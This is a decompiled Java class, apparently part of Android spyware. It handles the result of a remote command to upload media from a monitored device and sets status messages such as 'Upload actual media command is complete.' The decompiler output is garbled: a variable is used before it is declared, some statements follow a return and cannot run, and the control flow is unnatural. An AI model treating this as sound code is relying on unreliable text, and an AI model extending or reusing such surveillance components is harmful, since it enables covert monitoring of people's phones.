package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.datadeliverymanager.a.a;
import com.vvt.datadeliverymanager.i;
import com.vvt.eventrepository.c;
import com.vvt.exceptions.database.FxDatabaseException;
import com.vvt.io.exception.FxFileNotFoundException;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

class ce
  implements a
{
  ce(cd paramcd) {}
  
  public void a(i parami) {}
  
  public void b(i parami)
  {
    for (;;)
    {
      try
      {
        boolean bool = cd.a();
        if (bool) {}
        localObject1 = this.a;
        localObject1 = cd.b((cd)localObject1);
        localObject1 = ((AppEngine1)localObject1).j;
        localObject2 = this.a;
        int i = cd.a((cd)localObject2);
        long l = i;
        ((c)localObject1).d(l);
        bool = parami.f();
        if (!bool) {
          continue;
        }
        localObject1 = this.a;
        localObject1 = cd.c((cd)localObject1);
        i = 1;
        ((RmtCtrlOutputStatusMessage)localObject1).setSuccess(i);
        localObject1 = this.a;
        localObject1 = cd.c((cd)localObject1);
        localObject2 = "Upload actual media command is complete.";
        ((RmtCtrlOutputStatusMessage)localObject1).setMessage((String)localObject2);
      }
      catch (FxDatabaseException localFxDatabaseException)
      {
        Object localObject1;
        int j;
        cd.c(this.a).setSuccess(false);
        localObject2 = cd.c(this.a);
        String str1 = localFxDatabaseException.getMessage();
        ((RmtCtrlOutputStatusMessage)localObject2).setMessage(str1);
        continue;
      }
      catch (FxFileNotFoundException localFxFileNotFoundException)
      {
        cd.c(this.a).setSuccess(false);
        Object localObject2 = cd.c(this.a);
        String str2 = localFxFileNotFoundException.getMessage();
        ((RmtCtrlOutputStatusMessage)localObject2).setMessage(str2);
        continue;
      }
      cd.d(this.a).open();
      return;
      localObject1 = this.a;
      localObject1 = cd.c((cd)localObject1);
      j = 0;
      localObject2 = null;
      ((RmtCtrlOutputStatusMessage)localObject1).setSuccess(false);
      localObject1 = this.a;
      localObject1 = cd.c((cd)localObject1);
      localObject2 = parami.e();
      ((RmtCtrlOutputStatusMessage)localObject1).setMessage((String)localObject2);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/ce.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */